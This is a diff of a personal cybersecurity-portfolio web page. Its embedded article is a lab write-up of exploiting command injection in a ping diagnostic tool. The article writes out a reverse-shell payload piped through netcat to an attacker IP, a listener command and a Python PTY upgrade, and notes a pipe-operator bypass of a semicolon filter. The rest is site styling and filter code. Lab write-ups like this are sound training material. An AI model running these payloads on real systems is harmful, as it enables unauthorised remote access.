@@ -6,11 +6,11 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>Web-to-System Pivot via Command Injection | SOPHY&#39;S CYBERLAB</title>
-<meta name="keywords" content="">
+<meta name="keywords" content="Command Injection, Web Security, Privilege Escalation">
 <meta name="description" content="Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.">
 <meta name="author" content="Sophy">
 <link rel="canonical" href="http://localhost:1313/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
-<link crossorigin="anonymous" href="/cyber-portfolio/assets/css/stylesheet.8a669eb7b94e97f083bdeec683c36a9a69cd92337cda3fd420d96064b00b5fd5.css" integrity="sha256-imaet7lOl/CDve7Gg8NqmmnNkjN82j/UINlgZLALX9U=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/cyber-portfolio/assets/css/stylesheet.306c5765fc9a99cd03cca82a8ece7cd18ee598b3ff380a58397bdc5a1f316312.css" integrity="sha256-MGxXZfyamc0DzKgqjs580Y7lmLP/OApYOXvcWh8xYxI=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/cyber-portfolio/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/cyber-portfolio/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/cyber-portfolio/favicon-32x32.png">
@@ -137,69 +137,62 @@ document.addEventListener("DOMContentLoaded", function() {
 
      
     const tagButtons = document.querySelectorAll('.filter-tag');
-    const projectCards = document.querySelectorAll('.post-entry, .first-entry');
-    let activeTags = new Set();
+    let activeTag = 'all';
+
+    function applyFilter() {
+        const projectCards = document.querySelectorAll('.post-entry, .first-entry');
+
+        projectCards.forEach(card => {
+            if (activeTag === 'all') {
+                card.style.display = '';
+            } else if (activeTag.startsWith('cat:')) {
+                const targetCat = activeTag.replace('cat:', '').toLowerCase();
+                const cardCatsAttr = card.getAttribute('data-categories') || '';
+                const cardCats = cardCatsAttr.split(',').map(c => c.trim().toLowerCase());
+                if (cardCats.includes(targetCat)) {
+                    card.style.display = '';
+                } else {
+                    card.style.display = 'none';
+                }
+            } else {
+                const cardTagsAttr = card.getAttribute('data-tags') || '';
+                const cardTags = cardTagsAttr.split(',').map(t => t.trim().toLowerCase());
+                if (cardTags.includes(activeTag.toLowerCase())) {
+                    card.style.display = '';
+                } else {
+                    card.style.display = 'none';
+                }
+            }
+        });
+
+        
+        const categoryWrappers = document.querySelectorAll('.category-section-wrapper');
+        categoryWrappers.forEach(wrapper => {
+            const cardsInWrapper = wrapper.querySelectorAll('.post-entry');
+            let hasVisible = false;
+            cardsInWrapper.forEach(card => {
+                if (card.style.display !== 'none') hasVisible = true;
+            });
+            wrapper.style.display = hasVisible ? '' : 'none';
+        });
+    }
 
     tagButtons.forEach(btn => {
         btn.addEventListener('click', function() {
-            const tag = this.getAttribute('data-filter');
             
+            tagButtons.forEach(b => b.classList.remove('active'));
             
-            if (activeTags.has(tag)) {
-                activeTags.delete(tag);
-                this.classList.remove('active');
-            } else {
-                activeTags.add(tag);
-                this.classList.add('active');
-            }
-
-            
-            if (activeTags.size === 0) {
-                
-                projectCards.forEach(card => {
-                    card.style.display = 'flex';
-                });
-            } else {
-                projectCards.forEach(card => {
-                    
-                    const cardTagsAttr = card.getAttribute('data-tags');
-                    if (!cardTagsAttr) {
-                        card.style.display = 'none';
-                        return;
-                    }
-                    const cardTags = cardTagsAttr.split(',').map(t => t.trim());
-                    
-                    
-                    const hasTag = [...activeTags].some(activeTag => cardTags.includes(activeTag));
-                    
-                    if (hasTag) {
-                        card.style.display = 'flex';
-                    } else {
-                        card.style.display = 'none';
-                    }
-                });
-            }
-
-            
-            const categoryWrappers = document.querySelectorAll('.category-section-wrapper');
-            categoryWrappers.forEach(wrapper => {
-                const cardsInWrapper = wrapper.querySelectorAll('.post-entry');
-                let hasVisibleCard = false;
-                cardsInWrapper.forEach(card => {
-                    if (card.style.display !== 'none') {
-                        hasVisibleCard = true;
-                    }
-                });
-                if (hasVisibleCard) {
-                    wrapper.style.display = 'block';
-                } else {
-                    wrapper.style.display = 'none';
-                }
-            });
+            this.classList.add('active');
+            activeTag = this.getAttribute('data-filter');
+            applyFilter();
         });
     });
+
+    
+    applyFilter();
 });
 </script>
+
 <meta property="og:url" content="http://localhost:1313/cyber-portfolio/posts/web-to-system-pivot-reverse-shell/">
   <meta property="og:site_name" content="SOPHY&#39;S CYBERLAB">
   <meta property="og:title" content="Web-to-System Pivot via Command Injection">
@@ -209,6 +202,9 @@ document.addEventListener("DOMContentLoaded", function() {
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2025-09-30T10:00:00+01:00">
     <meta property="article:modified_time" content="2025-09-30T10:00:00+01:00">
+    <meta property="article:tag" content="Command Injection">
+    <meta property="article:tag" content="Web Security">
+    <meta property="article:tag" content="Privilege Escalation">
     <meta property="og:image" content="http://localhost:1313/cyber-portfolio/images/project6_reverse_shell.png">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://localhost:1313/cyber-portfolio/images/project6_reverse_shell.png">
@@ -244,7 +240,7 @@ document.addEventListener("DOMContentLoaded", function() {
   "name": "Web-to-System Pivot via Command Injection",
   "description": "Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.\n",
   "keywords": [
-    
+    "Command Injection", "Web Security", "Privilege Escalation"
   ],
   "articleBody": "Objective: To exploit a Command Injection vulnerability in a web application to bypass input filters and establish a persistent Remote Shell.\n1. The Vulnerability: Improper Input Validation The target was a web-based “Network Diagnostic Tool” designed to ping IP addresses. By analyzing the application’s behavior, I identified that it was passing user-supplied input directly to the system shell without proper sanitization. This allowed for Command Chaining, where a legitimate command is followed by a malicious one.\n2. Technical Execution: Bypassing Filters Initial attempts to use the semicolon (;) separator were blocked by the application’s basic “Sanity Check.” I successfully bypassed this restriction by using the Pipe (|) operator, which redirected the command flow to the system’s sh (shell) environment.\nComponent Value Purpose Exploit Vector Web Input Field (Ping) The entry point for the attack. Payload `127.0.0.1 | nc [Attacker_IP] [Port] -e /bin/sh` Execution of the attack string. Listener Netcat (nc -lvp) The “Ear” on Kali waiting for the connection. Target User www-data The service account running the web server. 3. Execution Workflow Listener Initialization: I opened a listening port on my Kali machine using Netcat to intercept the incoming connection. Payload Injection: I entered the malicious string into the web form. This told the server: “Ping yourself, but then open a connection to Sophy’s Kali machine and give her a terminal.” Connection Capture: The server executed the command, and a Reverse Shell was established. Shell Stabilization: To convert the “dumb” shell into a functional terminal, I utilized a Python PTY spawn trick to gain an interactive Bash prompt. 4. Key Commands Used On Kali: nc -lvp 4444 (To wait for the server’s call). In Web Box: 127.0.0.1 | nc 192.168.56.1 4444 -e /bin/sh (The “Phone Home” command). In Reverse Shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' (To stabilize the terminal). RESOURCES_NODE_01 Caption: Demonstrating the successful bypass of input validation to execute system commands through a web interface.\nRESOURCES_NODE_01 Caption: Establishing a persistent Reverse Shell and upgrading to a fully interactive TTY session.\n5. Professional Impact This project demonstrates Lateral Movement. It shows that even if a server is patched at the OS level, a single vulnerable web form can provide a gateway to the internal network. By upgrading the shell using Python, I proved my ability to maintain a stable “Command and Control” (C2) presence on a target, which is essential for deep-penetration testing.\n",
   "wordCount" : "393",
@@ -333,17 +329,25 @@ document.addEventListener("DOMContentLoaded", function() {
   
 
 <div class="tag-filter-container">
-    <div class="tag-filter-list" id="tag-filter-list">
+  <div class="tag-filter-list" id="tag-filter-list">
+    
+      
+      
         
-            
-            
+          <button class="filter-tag" data-filter="Command Injection">Command Injection</button>
         
-    </div>
+          <button class="filter-tag" data-filter="Web Security">Web Security</button>
+        
+          <button class="filter-tag" data-filter="Privilege Escalation">Privilege Escalation</button>
+        
+      
+    
+  </div>
 </div>
 
 <style>
 .tag-filter-container {
-    max-width: var(--uniform-width);
+    max-width: var(--uniform-width, 1200px);
     margin: 0 auto 30px auto;
     padding: 0 20px;
 }
@@ -356,10 +360,10 @@ document.addEventListener("DOMContentLoaded", function() {
 }
 
 .filter-tag {
-    background: var(--surface-highest);
-    color: var(--secondary);
-    border: 1px solid var(--outline);
-    padding: 6px 14px;
+    background: var(--surface-highest, #1e1e1e);
+    color: var(--secondary, #aaa);
+    border: 1px solid var(--outline, #333);
+    padding: 6px 16px;
     border-radius: 20px;
     font-family: 'Space Grotesk', sans-serif;
     font-size: 13px;
@@ -368,6 +372,7 @@ document.addEventListener("DOMContentLoaded", function() {
     transition: all 0.2s ease;
     text-transform: uppercase;
     letter-spacing: 0.05em;
+    white-space: nowrap;
 }
 
 .filter-tag:hover {
@@ -377,7 +382,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
 .filter-tag.active {
     background: var(--primary);
-    color: var(--on-primary);
+    color: #000;
     border-color: var(--primary);
 }
 </style>
@@ -527,11 +532,51 @@ document.addEventListener("DOMContentLoaded", function() {
 
   <footer class="post-footer">
     <ul class="post-tags">
+      <li><a href="http://localhost:1313/cyber-portfolio/tags/command-injection/">Command Injection</a></li>
+      <li><a href="http://localhost:1313/cyber-portfolio/tags/web-security/">Web Security</a></li>
+      <li><a href="http://localhost:1313/cyber-portfolio/tags/privilege-escalation/">Privilege Escalation</a></li>
     </ul>
 
     
-    <div class="author-bio-box" style="margin: 60px 0 40px 0; padding: 30px; background: var(--surface-low); border: 1px solid var(--outline); border-radius: 12px; display: flex; gap: 20px; align-items: center;">
-      <div class="bio-avatar" style="width: 80px; height: 80px; background: var(--surface-highest); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; color: var(--primary); border: 2px solid var(--outline-variant); flex-shrink: 0;">
+    <div class="related-projects-section" style="margin: 50px 0 40px 0;">
+      <h3 style="font-family: 'Space Grotesk', sans-serif; font-size: 22px; margin-bottom: 20px; border-bottom: 2px solid var(--outline); padding-bottom: 12px; display: flex; align-items: center; gap: 10px;">
+        <span class="material-symbols-outlined" style="color: var(--primary); font-size: 22px;">hub</span>
+        Related Projects
+      </h3>
+      <div class="related-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 16px;">
+        <a href="http://localhost:1313/cyber-portfolio/posts/regulatory-compliance-nist-iso/" style="display: flex; flex-direction: column; background: var(--surface-low); border: 1px solid var(--outline); border-radius: 10px; overflow: hidden; text-decoration: none; transition: transform 0.2s ease, border-color 0.2s ease;" onmouseover="this.style.borderColor='var(--primary)'; this.style.transform='translateY(-3px)';" onmouseout="this.style.borderColor='var(--outline)'; this.style.transform='none';">
+          <div style="height: 120px; overflow: hidden; background: #111;">
+            <img src="/cyber-portfolio/images/regulatory-compliance-nist-iso-discovery.png" alt="Regulatory Compliance &amp; Secure System Architecture (NIST/ISO 27001)" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.7; filter: grayscale(60%);">
+          </div>
+          <div style="padding: 14px;">
+            <h4 style="margin: 0 0 8px 0; font-size: 14px; color: var(--on-surface); line-height: 1.4;">Regulatory Compliance &amp; Secure System Architecture (NIST/ISO 27001)</h4>
+            <span style="font-size: 11px; color: var(--primary); text-transform: uppercase; letter-spacing: 0.05em; font-weight: 700;">View Case Study &rarr;</span>
+          </div>
+        </a>
+        <a href="http://localhost:1313/cyber-portfolio/posts/post-exploitation-data-exfiltration/" style="display: flex; flex-direction: column; background: var(--surface-low); border: 1px solid var(--outline); border-radius: 10px; overflow: hidden; text-decoration: none; transition: transform 0.2s ease, border-color 0.2s ease;" onmouseover="this.style.borderColor='var(--primary)'; this.style.transform='translateY(-3px)';" onmouseout="this.style.borderColor='var(--outline)'; this.style.transform='none';">
+          <div style="height: 120px; overflow: hidden; background: #111;">
+            <img src="/cyber-portfolio/images/project4_exfiltration.png" alt="Post-Exploitation &amp; Sensitive Data Exfiltration" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.7; filter: grayscale(60%);">
+          </div>
+          <div style="padding: 14px;">
+            <h4 style="margin: 0 0 8px 0; font-size: 14px; color: var(--on-surface); line-height: 1.4;">Post-Exploitation &amp; Sensitive Data Exfiltration</h4>
+            <span style="font-size: 11px; color: var(--primary); text-transform: uppercase; letter-spacing: 0.05em; font-weight: 700;">View Case Study &rarr;</span>
+          </div>
+        </a>
+        <a href="http://localhost:1313/cyber-portfolio/posts/professional-career-development/" style="display: flex; flex-direction: column; background: var(--surface-low); border: 1px solid var(--outline); border-radius: 10px; overflow: hidden; text-decoration: none; transition: transform 0.2s ease, border-color 0.2s ease;" onmouseover="this.style.borderColor='var(--primary)'; this.style.transform='translateY(-3px)';" onmouseout="this.style.borderColor='var(--outline)'; this.style.transform='none';">
+          <div style="height: 120px; overflow: hidden; background: #111;">
+            <img src="/cyber-portfolio/images/feature-professional-career-development.png" alt="Professional Career Development and Industry Engagement" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.7; filter: grayscale(60%);">
+          </div>
+          <div style="padding: 14px;">
+            <h4 style="margin: 0 0 8px 0; font-size: 14px; color: var(--on-surface); line-height: 1.4;">Professional Career Development and Industry Engagement</h4>
+            <span style="font-size: 11px; color: var(--primary); text-transform: uppercase; letter-spacing: 0.05em; font-weight: 700;">View Case Study &rarr;</span>
+          </div>
+        </a>
+      </div>
+    </div>
+
+    
+    <div class="author-bio-box" style="margin: 40px 0 40px 0; padding: 30px; background: var(--surface-low); border: 1px solid var(--outline); border-radius: 12px; display: flex; gap: 20px; align-items: center;">
+      <div class="bio-avatar" style="width: 80px; height: 80px; background: var(--surface-highest); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: var(--primary); border: 2px solid var(--outline-variant); flex-shrink: 0;">
         <span class="material-symbols-outlined" style="font-size: 40px;">terminal</span>
       </div>
       <div class="bio-content">
@@ -542,8 +587,6 @@ document.addEventListener("DOMContentLoaded", function() {
         </a>
       </div>
     </div>
-
-    
 <nav class="paginav">
   <a class="prev" href="http://localhost:1313/cyber-portfolio/posts/regulatory-compliance-nist-iso/">
     <span class="title">« Prev</span>
